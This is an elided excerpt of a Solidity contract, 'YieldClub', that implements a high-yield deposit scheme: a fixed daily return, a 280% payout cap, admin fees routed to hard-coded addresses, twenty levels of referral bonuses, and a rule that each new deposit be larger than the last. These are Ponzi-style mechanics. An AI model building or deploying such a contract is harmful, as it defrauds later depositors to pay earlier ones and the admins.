...
contract YieldClub is Ownable {
    ...
    address payable public dAdminAddr = payable(0xb5D6dB2bA124Df098d49a6CEC465320256EC4609);
    address payable public wAdminAddr = payable(0x5EBcFe48b8235ecF163271bB80034e45a9202c10);
    address payable public lAdminAddr = payable(0xecDe6A960d6EFc78b17810e52F823bc79197C71C);
    ...
    uint256 public ATH;
    uint256 public daily_rate       = 70;
    uint256 public active_levels    = 20;
    ...
    uint256 public constant MAX_PAYOUT              = 28000; // 280%
    uint256 public constant BASIC_RATE              = 70;
    uint256 public constant LOW_RATE                = 10;
    uint256 public constant DEPOSIT_ADMIN_FEE       = 200; // 2%
    uint256 public constant WITHDRAW_ADMIN_FEE      = 800; // 8%
    ...
    constructor() {
        ...
        ref_bonuses.push(2500);
        ref_bonuses.push(1500);
        ref_bonuses.push(1000);
        ref_bonuses.push(1000);
        ref_bonuses.push(700);
        ref_bonuses.push(700);
        ...
        cycles.push(60 ether);
        cycles.push(180 ether);
        cycles.push(350 ether);
    }
    ...
    function _setUpline(address _addr, address _upline, uint256 _amount) private {
        if(users[_addr].upline == address(0) && _upline != _addr && _addr != owner() && (users[_upline].deposit_time > 0 || _upline == owner())) {
            ...
            for(uint256 i = 0; i < ref_bonuses.length; i++) {
                ...
                if(users[_upline].referrals >= ref_directs[i]) {
    ...
    function _deposit(address _addr, uint256 _amount) private {
        ...
        if(users[_addr].deposit_time > 0) {
            ...
            require(_amount >= (users[_addr].deposit_amount * 3 / 2) && _amount <= cycles[users[_addr].cycle > cycles.length - 1 ? cycles.length - 1 : users[_addr].cycle], "Bad amount"); // 1,5x or greater than previous deposit
        }
        ...
        if(users[_addr].upline != address(0)) {
            users[users[_addr].upline].direct_bonus += _amount * 13 / 100;
            emit DirectPayout(users[_addr].upline, _addr, _amount * 13 / 100);
        }
    ...
    function _refPayout(address _addr, uint256 _amount) private {
        ...
        for(uint256 i = 0; i < active_levels; i++) {
            ...
            if(users[up].referrals >= ref_directs[i]) {
    ...
    function withdraw() external {
        ...
        uint256 admin_withdraw_fee = to_payout * WITHDRAW_ADMIN_FEE / PERCENTS_DIVIDER;
        uint256 contract_balance = getContractBalance();

        // check contract balance for safety
        if (contract_balance >= admin_withdraw_fee) wAdminAddr.transfer(admin_withdraw_fee);
        else if(contract_balance > 0) wAdminAddr.transfer(contract_balance);
    ...
    function incRef() internal{
        if(ref_bonuses[0] < 2500){
            ref_bonuses[0] = ref_bonuses[0] + 250;
            ref_bonuses[1] = ref_bonuses[1] + 150;
            ref_bonuses[2] = ref_bonuses[2] + 100;
            ref_bonuses[3] = ref_bonuses[3] + 100;
            ref_bonuses[4] = ref_bonuses[4] + 70;
            ref_bonuses[5] = ref_bonuses[5] + 70;
            ...
            ref_bonuses[15] = ref_bonuses[15] + 10;
            ref_bonuses[16] = ref_bonuses[16] + 10;
            ref_bonuses[17] = ref_bonuses[17] + 10;
            ref_bonuses[18] = ref_bonuses[18] + 10;
            ref_bonuses[19] = ref_bonuses[19] + 10;
        }
        if(active_levels < 20){
            active_levels += 1;
        }
    ...
    function payoutOf(address _addr) view external returns(uint256 payout, uint256 max_payout) {
        ...
        if(users[_addr].deposit_payouts < max_payout) {
            payout = users[_addr].deposit_amount * (daily_rate) * (block.timestamp - users[_addr].deposit_time) / TIME_STEP / PERCENTS_DIVIDER;
    ...
    */
    ...
    function userInfo2(address _addr) view external returns(uint256 withdrawLimit, uint256 turnover) {
        return (getWithdrawLimit(_addr), users2[_addr].teamTurnover);
    }

	function getUserDownlineCount(address userAddress) public view returns(uint256[20] memory referrals) {
    ...
    function poolTopInfo() view external returns(address[8] memory addrs, uint256[8] memory deps) {
        for(uint256 i = 0; i < pool_bonuses.length; i++) {
            if(pool_top[i] == address(0)) break;
